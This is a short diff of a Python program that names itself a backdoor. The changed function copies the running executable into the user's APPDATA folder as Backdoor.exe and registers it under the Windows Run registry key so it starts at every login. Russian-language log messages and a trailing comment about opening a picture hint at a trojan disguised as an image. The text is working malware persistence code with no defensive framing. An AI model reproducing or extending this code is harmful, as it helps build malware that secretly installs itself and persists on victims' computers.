@@ -175,30 +175,26 @@ def connection():
 
 def setup_autorun():
     location = os.environ["APPDATA"] + "\\Backdoor.exe"
-    
-    # Проверка существования файла в APPDATA
     if not os.path.exists(location):
+        shutil.copyfile(sys.executable, location)
         try:
-            shutil.copyfile(sys.executable, location)
-            logging.info(f"[+] Файл скопирован в {location}")
-        except Exception as e:
-            logging.error(f"[!!] Ошибка копирования файла в APPDATA: {e}")
-            return  # Прерываем, если копирование не удалось
-
-        # Запись в реестр
-        try:
+            logging.info(f"Попытка открыть ключ реестра...")
             with winreg.OpenKey(
                 winreg.HKEY_CURRENT_USER,
                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                 0,
                 winreg.KEY_SET_VALUE,
             ) as key:
+                logging.info(f"Ключ реестра открыт успешно. Попытка записи...")
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-                logging.info("[+] Запись в реестр выполнена успешно")
+                logging.info(f"[+] Запись в реестр успешно создана: {location}")
         except PermissionError:
             logging.error("[!!] Недостаточно прав для записи в реестр")
+        except FileNotFoundError:
+            logging.error("[!!] Ключ реестра не найден")
         except Exception as e:
-            logging.error(f"[!!] Ошибка записи в реестр: {e}")
+            logging.error(f"[!!] Другая ошибка: {e}")
+
 
     # Попытка открыть картинку
     try:
